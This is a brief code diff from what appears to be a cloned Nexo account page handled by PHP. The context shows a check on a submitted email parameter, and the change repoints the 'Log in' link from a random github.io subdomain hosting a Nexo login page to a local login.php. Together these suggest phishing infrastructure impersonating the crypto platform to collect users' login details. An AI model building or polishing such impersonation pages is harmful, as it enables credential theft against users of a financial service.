@@ -207,7 +207,7 @@ if (isset($_REQUEST['email'])){
   <span data-testid="web-ui.component.text" class="sc-cc3f2ffc-0 eDzTmY">
     Already have a Nexo account?
   </span>
-  <a href="https://p3xcnrtm.github.io/nexo/Login.html" class="sc-fdd821b1-0 eoxXtY variant-primary size-regular is-link" data-testid="account.public-navigation.cta">
+  <a href="login.php" class="sc-fdd821b1-0 eoxXtY variant-primary size-regular is-link" data-testid="account.public-navigation.cta">
     <div data-testid="web-ui.component.stack" class="sc-20d85afa-0 gqrZzc">
       <span data-testid="web-ui.component.text" class="sc-cc3f2ffc-0 frSwau">
         Log in
